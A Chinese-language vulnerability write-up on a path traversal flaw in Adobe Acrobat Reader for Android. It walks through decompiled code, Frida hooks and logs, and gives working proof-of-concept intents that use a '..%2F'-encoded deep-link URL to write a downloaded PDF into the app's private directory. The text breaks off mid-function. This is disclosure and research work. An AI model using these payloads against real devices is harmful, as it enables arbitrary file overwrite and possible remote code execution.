---
layout: post
title:  "[Adobe] [Acrobat Reader] AdobeReader处理DeepLink时未正确进行合法性校验导致下载PDF文件过程出现路径穿越可造成远程代码执行"
date:   2022-05-25 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

| 日期 | 版本 | 描述 | 作者 |
| :-: | :-: | :-: | :-: |
| 2022.05.25 | 1.0 | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

在安卓版本的Adobe Acrobat Reader中存在一个导出组件，其接收DeepLink处理过程中存在路径穿越导致下载的PDF文件可以覆盖任意私有目录下的文件，当合理构造覆盖文件的数据时即可实现任意代码执行，结合该组件可以通过浏览器访问，最终可达到通过浏览器访问一条链接即可远程代码执行效果

## 0x01 触发条件

| 上线时间 | 应用名 | 包名 | 版本号 | MD5 | 下载链接 |
| :-: | :-: | :-: | :-: | :-: | :-: |
| 2021.06.29 | Adobe Acrobat Reader | com.adobe.reader | 21.6.0.18197 | 4566eeb9e5a5145dafe909e2beddaa55 | https://www.apkmonk.com/download-app/com.adobe.reader/4_com.adobe.reader_2021-06-29.apk/ |

## 0x02 PoC

发送如下Intent，可在本应用私有目录下写入poc.pdf文件

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.setDataAndType(Uri.parse("http://192.168.0.102:8000/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Fpoc.pdf"), "application/*");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

观察私有目录文件

```shell
crosshatch:/data/data/com.adobe.reader # ls -al
total 237
drwx------  11 u0_a163 u0_a163         3488 2022-03-09 03:31 .
drwxrwx--x 203 system  system         24576 2022-03-07 02:14 ..
drwxrwx--x   3 u0_a163 u0_a163         3488 2022-03-07 02:16 app_com_birbit_jobqueue_jobs
drwxrwx--x   2 u0_a163 u0_a163         3488 2022-03-07 02:16 app_textures
drwxrwx--x   5 u0_a163 u0_a163         3488 2022-03-07 02:16 app_webview
drwxrws--x  52 u0_a163 u0_a163_cache   8192 2022-03-09 03:31 cache
drwxrws--x   2 u0_a163 u0_a163_cache   3488 2022-03-07 02:14 code_cache
drwxrwx--x   2 u0_a163 u0_a163         8192 2022-03-09 03:31 databases
drwxrwx--x  10 u0_a163 u0_a163         3488 2022-03-09 03:31 files
drwxrwx--x   2 u0_a163 u0_a163         3488 2022-03-07 02:16 no_backup
-rw-------   1 u0_a163 u0_a163       176936 2022-03-09 03:31 poc.pdf  // <--
drwxrwx--x   2 u0_a163 u0_a163         4096 2022-03-09 03:31 shared_prefs
```

## 0x03 前置知识

Uri在调用方法`getLastPathSegment()`时的两种表现

表现一，也是最正常的使用

```java
String deeplink = "http://127.0.0.1/a/b/c/../../../../../../../../poc.pdf";
Uri uri = Uri.parse(deeplink);
Log.e(TAG, "onCreate: " + uri.getLastPathSegment());

E/[w-info]: onCreate: poc.pdf
```

表现二，我们使用`%2F`编码符号`/`，导致取出的值带上了非预期的符号

```java
String deeplink = "http://127.0.0.1/a/b/c/../../../../../../../..%2Fpoc.pdf";
Uri uri = Uri.parse(deeplink);
Log.e(TAG, "onCreate: " + uri.getLastPathSegment());

E/[w-info]: onCreate: ../poc.pdf
```

如果用这个Uri去构造URL，我们也能保留`..%2F`

```java
String deeplink = "http://127.0.0.1/a/b/c/../../../../../../../..%2Fpoc.pdf";
Uri uri = Uri.parse(deeplink);
URL url = new URL(uri.toString());
Log.e(TAG, "onCreate: " + url);

E/[w-info]: onCreate: http://127.0.0.1/..%2Fpoc.pdf
```

## 0x04 Root Cause

组件`com.adobe.reader.AdobeReader`导出，且支持使用DeepLink打开在线PDF文件

```xml
<activity 
    android:theme="@style/Theme_Virgo_SplashScreen" 
    android:name="com.adobe.reader.AdobeReader" 
    android:exported="true" 
    android:launchMode="singleTask" 
    android:screenOrientation="user" 
    android:configChanges="smallestScreenSize|screenSize|screenLayout|keyboardHidden" 
    android:noHistory="false" 
    android:resizeableActivity="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <action android:name="android.intent.action.EDIT"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="content"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

挑选一条外部可控的调用路径，此处的`MAM`可以不用在意，按照`onResume()`来理解即可

```
[
    Lcom/adobe/reader/AdobeReader;->handleIntent()V
    Lcom/adobe/reader/AdobeReader;->handleOnResume()V
    Lcom/adobe/reader/AdobeReader;->onMAMResume()V
]
```

关于`onMAMCreate()`类型的方法可以参考以下文档

- http://msintuneappsdk.github.io/ms-intune-app-sdk-android/reference/com/microsoft/intune/mam/client/app/MAMActivity.html#onMAMCreate(android.os.Bundle)

从DeepLink调用到Activity会根据环境的不同而有不同的表现，比如当前组件未被打开，会调用`onCreate()`，如果已经打开且存在于任务栈中，则会调用`onNewIntent()`，最终都会走到`onResume()`

回到应用，直接看`onMAMResume()`，只需要我们传入Uri的Host符合条件，就可以进入`[1]`，控制字段`"hideOptionalScreen"`为`"true"`就可以让`shouldDisableOptionalSignForAutomation()`返回`true`，注意这里是`"true"`不是`true`

```java
// com.adobe.reader.AdobeReader
public static String getDCBaseUrl() {
    return ARServicesAccount.getInstance().getMasterURI().equals("Prod") ? "https://documentcloud.adobe.com" : "https://dc.stage.acrobat.com";
}

public static String getOldDCBaseUrl() {
    return ARServicesAccount.getInstance().getMasterURI().equals("Prod") ? "https://dc.acrobat.com" : "https://dc.stage.acrobat.com";
}
    
public class AdobeReader extends AppCompatActivity implements ARSigningUtilsHandleOnClickingCross {

    @Override  // androidx.fragment.app.FragmentActivity
    public void onMAMResume() {
        super.onMAMResume();
        if(this.getIntent() == null) {  // intent不能为空
            this.finish();
        }
        else if(this.getIntent().getBooleanExtra(ARInstallReferrerBroadcastReceiver.EUREKA_INSTALL_REFERRER_RECIEVED, false)) {
            ...
        }
        else {
            if(this.mShouldCheckForLogin) {
                this.mOptionalSigning.updateOptionalSigningCountBeforeSigning(this);
            }

            ARThumbnailAPI.removeThumbnailsForInvalidFiles();
            String __intent_data_host__ = this.getHostFromIntent();
            if(__intent_data_host__ != null && ((ARReviewServiceConfig.getDCBaseUrl().contains(__intent_data_host__)) 
                || (ARReviewServiceConfig.getOldDCBaseUrl().contains(__intent_data_host__))) && (ARApp.getAEPMigrationPref())) {
                ...
            }
            else {
                this.handleOnResume();  // [1]
            }
        }

        ARSilentDynamicFeatureDownloader.startSilentDownloadOfDynamicFeatures(this.getApplication());
        ARDCMAnalytics.getInstance().logAnalyticsForAppNotificationSetting(this);
    }
    
    private void handleOnResume() {
        if(!ARIntentUtils.isEurekaReviewIntent(this.getIntent()) && !ARServicesAccount.getInstance().isSignedIn() 
                && !this.shouldDisableOptionalSignForAutomation(this.getIntent())) {
            this.handleSSO();
            return;
        }

        this.handleIntent();  // [2]
    }
```

如下构造POC即可使业务逻辑走到`[2]`

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

Frida代码

```javascript
$ frida -U -f com.adobe.reader -l frida_hook.js --no-pause

Java.perform(function() {
    let AdobeReader = Java.use("com.adobe.reader.AdobeReader");
    AdobeReader.handleIntent.implementation = function(){
        console.log('[w-info] handleIntent is called');
        console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));
        return this.handleIntent();
    };
});
```

调用栈如下

```
[w-info] handleIntent is called
java.lang.Throwable
        at com.adobe.reader.AdobeReader.handleIntent(Native Method)
        at com.adobe.reader.AdobeReader.handleOnResume(AdobeReader.java:129)
        at com.adobe.reader.AdobeReader.onMAMResume(AdobeReader.java:191)
        at com.microsoft.intune.mam.client.app.offline.OfflineActivityBehavior.onResume(OfflineActivityBehavior.java:337)
        at com.microsoft.intune.mam.client.app.MAMActivity.onResume(MAMActivity.java:106)
        at android.app.Instrumentation.callActivityOnResume(Instrumentation.java:1412)
        ...
```

`handleIntent()`一共有五个判断点，前四个判断点不能进入，只能进入第五个判断点

```java
// com.adobe.reader.AdobeReader
public class AdobeReader extends AppCompatActivity implements ARSigningUtilsHandleOnClickingCross {

    private void handleIntent() {
        this.mShouldCheckForLogin = false;
        Intent __intent__ = this.getIntent();  // 获取传入的intent
        v1.toString();  // 此处反编译错误，不影响
        if((this.wasLaunchedFromRecents()) && (ARHomeActivity.getIsBackPressedForExitingApp())) {  // 第一个判断点
            ...
            return;
        }

        if(ARIntentUtils.isEurekaReviewIntent(__intent__)) {  // 第二个判断点
            ...
            return;
        }

        if(ARIntentUtils.isSendAndTrackReviewIntent(__intent__)) {  // 第三个判断点
            ...
            return;
        }

        if(!TextUtils.equals(__intent__.getScheme(), "http") && !TextUtils.equals(__intent__.getScheme(), "https")) {  // 第四个判断点
            ...
            return;
        }

        if(__intent__.getData() != null && !__intent__.getData().toString().contains("app.link")) {  // 第五个判断点
            ...
            return;
        }

        ...
    }
    
    ...
}
```

第一个判断点只有在返回键被按下才会成立，所以正常调用的情况下不会进入

```java
// com.adobe.reader.home.ARHomeActivity
public class ARHomeActivity extends AppCompatActivity implements FWTabChangeRequestListener, FWFabListener, FWCustomActionBarListener, FWNavigationVisibilityListener, FWSnackBarListener, ARHomeNavigationItemSelectionListener, ARClearRecentSearchesConfirmationListener {

    public static boolean getIsBackPressedForExitingApp() {
        boolean sIsBackPressedForExitingApp;
        Class v0 = ARHomeActivity.class;
        synchronized(v0) {
            sIsBackPressedForExitingApp = ARHomeActivity.sIsBackPressedForExitingApp;
        }

        return sIsBackPressedForExitingApp;
    }
    
    private static void setIsBackPressedForExitingApp(boolean sIsBackPressedForExitingApp) {
        Class v0 = ARHomeActivity.class;
        synchronized(v0) {
            ARHomeActivity.sIsBackPressedForExitingApp = sIsBackPressedForExitingApp;  // 设置点
        }
    }
    
    private void addCompanionFragment() {
        ...
        ARHomeActivity.setIsBackPressedForExitingApp(false);
    }
    
    @Override  // androidx.activity.ComponentActivity
    public void onBackPressed() {
        ...
        if(v2 != 0) {
            ARHomeActivity.setIsBackPressedForExitingApp(true);  // 当按下返回键会将该值设置为True
            super.onBackPressed();
        }
    }
    
    @Override  // androidx.appcompat.app.AppCompatActivity
    public void onMAMCreate(Bundle bundle) {
        ...
        ARHomeActivity.setIsBackPressedForExitingApp(false);
    }
    
    ...
}
```

第二个判断点

```java
// com.adobe.reader.utils.ARIntentUtils
public class ARIntentUtils {

    private static boolean hasReviewServerBaseURI(String __intent_uri_string__) {
        return __intent_uri_string__ != null && ((__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130072))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130074))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130073))));
    }
    
    private static boolean isEurekaFile(String __intent_uri_string__) {
        return __intent_uri_string__ != null && ((__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130075))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130077))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130076))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130064)))) && (ARIntentUtils.checkForFileType(__intent_uri_string__).equals("review"));
    }
    
    public static boolean isEurekaReviewIntent(Intent __intent__) {
        String __intent_uri_string__ = __intent__.getDataString();
        if(ARApp.getAEPMigrationPref()) {
            return __intent_uri_string__ != null ? ARShareLinkInfo.getInstance().getShareFileType() == OPENED_FILE_TYPE.REVIEW : false;  // "REVIEW"
        }

        return (ARIntentUtils.hasReviewServerBaseURI(__intent_uri_string__)) || (ARIntentUtils.isEurekaFile(__intent_uri_string__));
    }
    
    ...
}
```

第三个判断点

```java
// com.adobe.reader.utils.ARIntentUtils
public class ARIntentUtils {

    private static boolean hasFilesServerBaseURI(String __intent_uri_string__) {
        return __intent_uri_string__ != null && ((__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130E79))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130E7A))));
    }
    
    private static boolean isSendAndTrackFile(String __intent_uri_string__) {
        return __intent_uri_string__ != null && ((__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130075))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130077))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130076))) || (__intent_uri_string__.contains(ARApp.getAppContext().getString(0x7F130064)))) && (ARIntentUtils.checkForFileType(__intent_uri_string__).equals("track"));
    }

    public static boolean isSendAndTrackReviewIntent(Intent __intent__) {
        String __intent_uri_string__ = __intent__.getDataString();
        if(ARApp.getAEPMigrationPref()) {
            return __intent_uri_string__ != null ? ARShareLinkInfo.getInstance().getShareFileType() == OPENED_FILE_TYPE.SEND_AND_TRACK : false;  // "SEND_AND_TRACK"
        }

        return (ARIntentUtils.hasFilesServerBaseURI(__intent_uri_string__)) || (ARIntentUtils.isSendAndTrackFile(__intent_uri_string__));
    }
    
    ...
}
```

第四个判断点，只要是`http`或者`https`即可绕过

第五个判断点

```java
if(__intent__.getData() != null && !__intent__.getData().toString().contains("app.link")) {  // 第五个判断点
    Intent intentToARFileURLDownloadActivity = new Intent(this, ARFileURLDownloadActivity.class);
    intentToARFileURLDownloadActivity.putExtra("FILE_PATH_key", __intent__.getData());
    intentToARFileURLDownloadActivity.putExtra("FILE_MIME_TYPE", __intent__.getType());
    this.startActivity(intentToARFileURLDownloadActivity);  // [3]
    this.logSourceInfo();
    this.logLaunchAnalytics("Document Download", __intent__.getAction(), __intent__.getType());
    this.finish();
    return;
}
```

如下构造POC即可使业务逻辑走到`[3]`，添加了Uri和Type字段

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.setDataAndType(Uri.parse("https://127.0.0.1/a/b/c/poc.pdf"), "application/*");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

Frida代码

```javascript
let Activity = Java.use("android.app.Activity")
Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
    console.log("[w-info] android.app.Activity.startActivity()")
    console.log(intent)
    console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));
    return this.startActivity(intent)
};
```

调用栈如下

```shell
[w-info] android.app.Activity.startActivity()
Intent { cmp=com.adobe.reader/.misc.ARFileURLDownloadActivity (has extras) }
java.lang.Throwable
        at android.app.Activity.startActivity(Native Method)
        at com.adobe.reader.AdobeReader.handleIntent(AdobeReader.java:406)
        at com.adobe.reader.AdobeReader.handleIntent(Native Method)
        at com.adobe.reader.AdobeReader.handleOnResume(AdobeReader.java:129)
        at com.adobe.reader.AdobeReader.onMAMResume(AdobeReader.java:191)
        at com.microsoft.intune.mam.client.app.offline.OfflineActivityBehavior.onResume(OfflineActivityBehavior.java:337)
        at com.microsoft.intune.mam.client.app.MAMActivity.onResume(MAMActivity.java:106)
        at android.app.Instrumentation.callActivityOnResume(Instrumentation.java:1412)
        ...
```

跳转到`ARFileURLDownloadActivity`后，会将传入Uri的Path字段取出并构造出一个文件路径，用于界面展示，然后传进来的数据会被整合传递到`ARFileURLDownloadService`

```java
// com.adobe.reader.misc.ARFileURLDownloadActivity
public class ARFileURLDownloadActivity extends ARFileTransferActivity {

    @Override  // com.adobe.reader.misc.ARFileTransferActivity
    public void onMAMCreate(Bundle bundle) {
        super.onMAMCreate(bundle);
        this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class);  // 构造Intent
        Bundle newBundle = new Bundle();
        Bundle __intent_extras__ = this.getIntent().getExtras();
        Uri __intent_extras_FILE_PATH_key__ = (Uri)__intent_extras__.getParcelable("FILE_PATH_key");
        String __intent_extras_FILE_MIME_TYPE__ = __intent_extras__.getString("FILE_MIME_TYPE");
        String __intent_extras_FILE_PATH_key_lastPathSegment__ = __intent_extras_FILE_PATH_key__.getLastPathSegment();  // 获取Uri的Path，外部可控
        if(__intent_extras_FILE_PATH_key_lastPathSegment__ == null) {
            new BBToast(ARApp.getAppContext(), 1).withText(this.getResources().getString(0x7F13063E)).show();  // 无效的文件名
            this.finish();
            return;
        }

        String modifiedFileNameWithExtension = BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(__intent_extras_FILE_PATH_key_lastPathSegment__, __intent_extras_FILE_MIME_TYPE__, null, __intent_extras_FILE_PATH_key__);  // 漏洞点
        String IDS_CLOUD_DOWNLOADING_STR = this.getString(0x7F130222);  // 正在打开
        newBundle.putParcelable("FILE_PATH_key", __intent_extras_FILE_PATH_key__);
        String fileID = String.valueOf(System.currentTimeMillis());  // 这个字段用于后续通知
        this.mFileID = fileID;
        newBundle.putCharSequence("FILE_ID_key", fileID);
        newBundle.putString("FILE_MIME_TYPE", __intent_extras_FILE_MIME_TYPE__);
        ((TextView)this.findViewById(0x7F0B0225)).setText(modifiedFileNameWithExtension);
        this.setTransferStatusText(IDS_CLOUD_DOWNLOADING_STR);
        ((ImageView)this.findViewById(0x7F0B0220)).setImageResource(ARUtils.getProgressViewDrawableIconForFile(modifiedFileNameWithExtension, __intent_extras_FILE_MIME_TYPE__));  // 进度条
        this.registerBroadcastReceivers();
        LocalBroadcastManager.getInstance(this).registerReceiver(this.mBroadcastReceiver_urlDismissDownload, new IntentFilter("com.adobe.reader.misc.ARFileURLDownloadService.URLDismissDownload"));  // 注册取消下载Receiver
        this.mServiceIntent.putExtras(newBundle);
        this.startService();  // [4]
    }
    
    protected void startService() {
        if(!ARRunTimeStoragePermissionUtils.checkAndRequestStoragePermissions(this, null, 110)) {
            this.startService(this.mServiceIntent);  // [5]
        }
    }
    
    ...
}
```

进入`ARFileURLDownloadService`后，会先判断当前是否有下载任务，此处我们不考虑复杂场景，直接跳过这个分支，字段`"FILE_PATH_key"`和其它两个字段用于构造`ARURLFileDownloadAsyncTask`对象，`[6]`开始处理业务逻辑

```java
// com.adobe.reader.misc.ARFileURLDownloadService
public class ARFileURLDownloadService extends MAMService {
    private BroadcastReceiver broadcastReceiver_cancelUrlDownload;
    private ARURLFileDownloadAsyncTask mURLFileDownloadAsyncTask;

    public ARFileURLDownloadService() {
        this.broadcastReceiver_cancelUrlDownload = new MAMBroadcastReceiver() {
            @Override  // com.microsoft.intune.mam.client.content.HookedBroadcastReceiver
            public void onMAMReceive(Context arg1, Intent arg2) {
                String v1 = (String)arg2.getExtras().getCharSequence("FILE_ID_key");
                if(ARFileURLDownloadService.this.mURLFileDownloadAsyncTask != null && (ARFileURLDownloadService.this.mURLFileDownloadAsyncTask.getFileID().equals(v1))) {
                    ARFileURLDownloadService.this.cancelFileTransferAsyncTask(ARFileURLDownloadService.this.mURLFileDownloadAsyncTask);
                    ARFileURLDownloadService.this.mURLFileDownloadAsyncTask = null;
                }
            }
        };
    }

    private void cancelFileTransferAsyncTask(ARURLFileDownloadAsyncTask arURLFileDownloadAsyncTask) {
        if(arURLFileDownloadAsyncTask != null && arURLFileDownloadAsyncTask.getStatus() != AsyncTask.Status.FINISHED) {
            arURLFileDownloadAsyncTask.cancel(true);
        }
    }

    @Override  // android.app.Service
    public void onCreate() {
        super.onCreate();
        LocalBroadcastManager.getInstance(this).registerReceiver(this.broadcastReceiver_cancelUrlDownload, new IntentFilter("com.adobe.reader.misc.ARFileURLDownloadService.URLCancelDownload"));  // 注册取消下载Receiver
    }

    @Override  // com.microsoft.intune.mam.client.app.MAMService
    public int onMAMStartCommand(Intent __intent__, int arg9, int arg10) {
        if(__intent__ != null) {
            Bundle __intent_extras__ = __intent__.getExtras();
            if(this.mURLFileDownloadAsyncTask != null) {
                Intent intentToURLDismissDownload = new Intent("com.adobe.reader.misc.ARFileURLDownloadService.URLDismissDownload");
                Bundle newBundle = new Bundle();
                newBundle.putCharSequence("FILE_ID_key", this.mURLFileDownloadAsyncTask.getFileID());
                intentToURLDismissDownload.putExtras(newBundle);
                LocalBroadcastManager.getInstance(this).sendBroadcast(intentToURLDismissDownload);
                this.cancelFileTransferAsyncTask(this.mURLFileDownloadAsyncTask);
                this.mURLFileDownloadAsyncTask = null;
            }

            Uri __intent_extras_FILE_PATH_key__ = (Uri)__intent_extras__.getParcelable("FILE_PATH_key");
            String __intent_extras_FILE_MIME_TYPE__ = __intent_extras__.getString("FILE_MIME_TYPE", null);
            String __intent_extras_FILE_ID_key__ = (String)__intent_extras__.getCharSequence("FILE_ID_key");
            ARURLFileDownloadAsyncTask arURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), __intent_extras_FILE_PATH_key__, __intent_extras_FILE_ID_key__, true, __intent_extras_FILE_MIME_TYPE__);  // 漏洞点
            this.mURLFileDownloadAsyncTask = arURLFileDownloadAsyncTask;
            arURLFileDownloadAsyncTask.taskExecute(new Void[0]);  // [6]
        }

        return 2;
    }
}
```

对类`ARURLFileDownloadAsyncTask`的构造方法进行注入

```javaScript
let ARURLFileDownloadAsyncTask = Java.use("com.adobe.reader.misc.ARURLFileDownloadAsyncTask");
ARURLFileDownloadAsyncTask.$init.implementation = function(application, uri, str, z, str2){
    console.log('[w-info] $init is called');
    console.log(uri);
    console.log(str2);
    console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));
    return this.$init(application, uri, str, z, str2);
};
```

调用栈和参数如下

```shell
[w-info] $init is called
https://127.0.0.1/a/b/c/poc.pdf
application/*
java.lang.Throwable
        at com.adobe.reader.misc.ARURLFileDownloadAsyncTask.<init>(Native Method)
        at com.adobe.reader.misc.ARFileURLDownloadService.onMAMStartCommand(ARFileURLDownloadService.java:72)
        at com.adobe.reader.misc.ARFileURLDownloadService.onMAMStartCommand(Native Method)
        at com.microsoft.intune.mam.client.app.offline.OfflineServiceBehavior.onStartCommand(OfflineServiceBehavior.java:36)
        at com.microsoft.intune.mam.client.app.MAMService.onStartCommand(MAMService.java:74)
        at android.app.ActivityThread.handleServiceArgs(ActivityThread.java:3705)
        ...
```

`[7]`调用到方法`ARURLFileDownloadAsyncTask.downloadFile()`，方法`BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData()`会对需要下载的文件进行路径识别并返回一个重新编辑过的文件名，此处即是漏洞点

```java
// com.adobe.reader.misc.ARURLFileDownloadAsyncTask
public class ARURLFileDownloadAsyncTask extends SVFileTransferAbstractAsyncTask {
    private String mMimeTypeFromIntent;
    private Uri mUri;

    public ARURLFileDownloadAsyncTask(Application arg2, Uri __intent_extras_FILE_PATH_key__, String __intent_extras_FILE_ID_key__, boolean arg5, String __intent_extras_FILE_MIME_TYPE__) {
        super(arg2, __intent_extras_FILE_PATH_key__.toString(), __intent_extras_FILE_ID_key__, arg5);
        this.mUri = __intent_extras_FILE_PATH_key__;
        this.mMimeTypeFromIntent = __intent_extras_FILE_MIME_TYPE__;
    }

    private void downloadFile() throws IOException, SVFileDownloadException {
        int flag = 0;
        URL __mUriToURL__ = new URL(this.mUri.toString());
        Exception exception = null;
        try {
            String __downloadPdfFileName__ = BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(this.mUri.getLastPathSegment(), this.mMimeTypeFromIntent, null, this.mUri);  // 获取文件名
            String __downloadPdfFilePath__ = new ARFileFromURLDownloader(new DownloadUrlListener() {
                @Override  // com.adobe.reader.misc.ARFileFromURLDownloader$DownloadUrlListener
                public void onProgressUpdate(int arg3, int arg4) {
                    ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, arg3, arg4);
                }

                @Override  // com.adobe.reader.misc.ARFileFromURLDownloader$DownloadUrlListener
                public boolean shouldCancelDownload() {
                    return ARURLFileDownloadAsyncTask.this.isCancelled();
                }
            }).downloadFile(__downloadPdfFileName__, __mUriToURL__);  // [8]
            if(BBFileUtils.fileExists(__downloadPdfFilePath__)) {
                File v4_1 = new File(__downloadPdfFilePath__);
                if(ARFileUtils.checkIfInputStreamHasPDFContent(() -> new FileInputStream(v4_1))) {
                    this.updateFilePath(__downloadPdfFilePath__);
                    flag = 0;
                }
                else {
                    v4_1.delete();
                    flag = 1;
                }
            }
            else {
                goto label_38;
            }

            goto label_40;
        }

        flag = 1;
        goto label_40;
    label_38:
        flag = 1;
    label_40:
        if(flag == 0) {
            ARDCMAnalytics.getInstance().trackFileDownloadFromUrlCompleteStatus(1 ^ flag, null, __mUriToURL__);
            return;  // 从这里返回
        }

        ...
    }
    
    @Override  // com.adobe.libs.services.blueheron.SVFileTransferAbstractAsyncTask
    public void executeTask() throws Exception {
        this.downloadFile();  // [7]
    }
    
    ...
}
```

重新编辑文件名的逻辑如下，结合前置知识，此处可以通过`..%2F`来编码`../`，从而造成返回的文件名变成`../poc.pdf`

```java
// com.adobe.libs.buildingblocks.utils.BBIntentUtils
public final class BBIntentUtils {

    public static String getModifiedFileNameWithExtensionUsingIntentData(String __intent_extras_FILE_PATH_key_lastPathSegment__, String __intent_extras_FILE_MIME_TYPE__, ContentResolver contentResolver, Uri __intent_extras_FILE_PATH_key__) {
        if(TextUtils.isEmpty(__intent_extras_FILE_PATH_key_lastPathSegment__)) {
            __intent_extras_FILE_PATH_key_lastPathSegment__ = "downloaded_file";
        }

        CharSequence type = null;
        if(contentResolver != null && __intent_extras_FILE_PATH_key__ != null) {
            type = MAMContentResolverManagement.getType(contentResolver, __intent_extras_FILE_PATH_key__);
        }

        String contentResolver2 = TextUtils.isEmpty(type) ? __intent_extras_FILE_MIME_TYPE__ : ((String)type);  // pdf
        if(!TextUtils.isEmpty(contentResolver2)) {
            String fileExtension = BBFileUtils.getFileExtensionFromMimeType(contentResolver2);
            if(!TextUtils.isEmpty(fileExtension)) {
                if(__intent_extras_FILE_PATH_key_lastPathSegment__.lastIndexOf(46) == -1) {  // 46对应的符号为"."
                    return __intent_extras_FILE_PATH_key_lastPathSegment__ + '.' + fileExtension;  // 返回../poc.pdf
                }

                ...
            }
        }

        return __intent_extras_FILE_PATH_key_lastPathSegment__;
    }
    
    ...
}
```

打印方法`BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData()`的返回值

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.setDataAndType(Uri.parse("https://127.0.0.1/a/b/c/..%2F..%2F..%2F..%2Fpoc.pdf"), "application/*");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

Frida代码

```javascript
let BBIntentUtils = Java.use("com.adobe.libs.buildingblocks.utils.BBIntentUtils");
BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData.implementation = function(str, str2, contentResolver, uri){
    console.log('[w-info] getModifiedFileNameWithExtensionUsingIntentData is called');
    let ret = this.getModifiedFileNameWithExtensionUsingIntentData(str, str2, contentResolver, uri);
    console.log('[w-info] getModifiedFileNameWithExtensionUsingIntentData ret value is ' + ret);
    return ret;
};
```

打印出来的返回值带上了`../`

```shell
[w-info] getModifiedFileNameWithExtensionUsingIntentData ret value is ../../../../poc.pdf
```

同时我们也看下传入`downloadFile()`的参数

Frida代码

```javascript
let ARFileFromURLDownloader = Java.use("com.adobe.reader.misc.ARFileFromURLDownloader");
ARFileFromURLDownloader.downloadFile.implementation = function(title, url){
    console.log('[w-info] downloadFile is called');
    console.log("[w-info] arg1: " + title);
    console.log("[w-info] arg2: " + url);
    console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));
    return this.downloadFile(title, url);
};
```

运行日志

```
[w-info] downloadFile is called
[w-info] arg1: ../../../../poc.pdf
[w-info] arg2: https://127.0.0.1/a/b/c/..%2F..%2F..%2F..%2Fpoc.pdf
java.lang.Throwable
        at com.adobe.reader.misc.ARFileFromURLDownloader.downloadFile(Native Method)
        at com.adobe.reader.misc.ARURLFileDownloadAsyncTask.downloadFile(ARURLFileDownloadAsyncTask.java:213)
        at com.adobe.reader.misc.ARURLFileDownloadAsyncTask.executeTask(ARURLFileDownloadAsyncTask.java:80)
        at com.adobe.libs.services.blueheron.SVFileTransferAbstractAsyncTask.doInBackground(SVFileTransferAbstractAsyncTask.java:196)
        at com.adobe.libs.services.blueheron.SVFileTransferAbstractAsyncTask.doInBackground(SVFileTransferAbstractAsyncTask.java:46)
        at android.os.AsyncTask$2.call(AsyncTask.java:333)
        at java.util.concurrent.FutureTask.run(FutureTask.java:266)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
        at java.lang.Thread.run(Thread.java:764)
```

最后的下载逻辑需要使用到重新编辑的文件名，具体实现在方法`getDocPathForExternalCopy()`里，这个方法会到存储卡上找一个目录，拼接上重新编辑过的文件名，返回最后要下载存储的文件路径，进入`[9]`

```java
// com.adobe.reader.misc.ARURLFileDownloadAsyncTask
public final class ARFileFromURLDownloader {

    public final String downloadFile(String __downloadPdfFileName__, URL __mUriToURL__) throws IOException {
        String __finalDownloadPdfFilePath__;
        Intrinsics.checkNotNullParameter(__downloadPdfFileName__, "title");
        Intrinsics.checkNotNullParameter(__mUriToURL__, "url");
        if(ARFileBrowserUtils.isPermanentStorageAvailable()) {
            __finalDownloadPdfFilePath__ = this.getDocPathForExternalCopy(__downloadPdfFileName__);
            if(!this.validateIfDocPathCanBeUsed(__finalDownloadPdfFilePath__)) {
                ARFileOpenAnalytics.logUrlReadFailureEvent();
                __finalDownloadPdfFilePath__ = null;
            }
        }
        else {
            __finalDownloadPdfFilePath__ = null;
        }
    
        if(__finalDownloadPdfFilePath__ == null) {
            __finalDownloadPdfFilePath__ = this.getDocPathForInternalCopy(__downloadPdfFileName__);
        }
    
        String v4 = __mUriToURL__.toString();
